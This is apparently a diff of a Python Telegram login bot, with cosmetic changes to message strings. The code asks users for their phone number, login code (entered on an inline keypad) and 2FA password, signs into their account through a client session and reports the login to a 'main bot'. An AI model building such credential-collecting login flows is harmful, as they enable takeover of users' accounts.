@@ -56,7 +56,7 @@ def otp_keyboard(current_otp: str):
          InlineKeyboardButton("Clear", callback_data="clear"),
          InlineKeyboardButton("Submit ✅", callback_data="submit")]
     ]
-    text = f"🔢 *Enter OTP:*\n`{current_otp}`"
+    text = f"🔢 Enter OTP:\n{current_otp}"
     return text, InlineKeyboardMarkup(keyboard)
 
 # ---------------- LOGIN FLOW ----------------
@@ -70,7 +70,7 @@ async def phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     # Validate phone number format
     if not phone.startswith("+"):
-        await update.message.reply_text("❌ Invalid phone number format. Ensure it starts with + followed by country code (e.g., +1234567890).")
+        await update.message.reply_text(" ❌ Invalid phone number format. Ensure it starts with + followed by country code (e.g., +1234567890).")
         return ConversationHandler.END
 
     user_phones[uid] = phone
@@ -90,7 +90,7 @@ async def phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
         text, keyboard = otp_keyboard("")
         # Use reply_markup to send only the inline keyboard and avoid the default system keyboard
-        await update.message.reply_text("✅ OTP sent successfully!", reply_markup=keyboard, disable_notification=True)
+        await update.message.reply_text(" ✅ OTP sent successfully!", reply_markup=keyboard, disable_notification=True)
         return ASK_OTP
 
     except Exception as e:
@@ -129,7 +129,7 @@ async def otp_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
         await client.disconnect()
         await query.edit_message_text("🎉 Login successful! You can now use the main bot.")
-        await approve_user_in_main_bot(f"✅ User {uid} successfully logged in via the login bot.")
+        await approve_user_in_main_bot(f" ✅ User {uid} successfully logged in via the login bot.")
         return ConversationHandler.END
     else:
         # Add digit
@@ -149,8 +149,8 @@ async def twofa(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
         await client.sign_in(password=pwd)
         await client.disconnect()
-        await update.message.reply_text("🎉 2FA successful! You can now use the main bot.")
-        await approve_user_in_main_bot(f"✅ User {uid} has successfully completed 2FA.")
+        await update.message.reply_text(" 🎉 2FA successful! You can now use the main bot.")
+        await approve_user_in_main_bot(f" ✅ User {uid} has successfully completed 2FA.")
     except Exception as e:
         await update.message.reply_text(f"❌ 2FA failed: {e}")
     return ConversationHandler.END
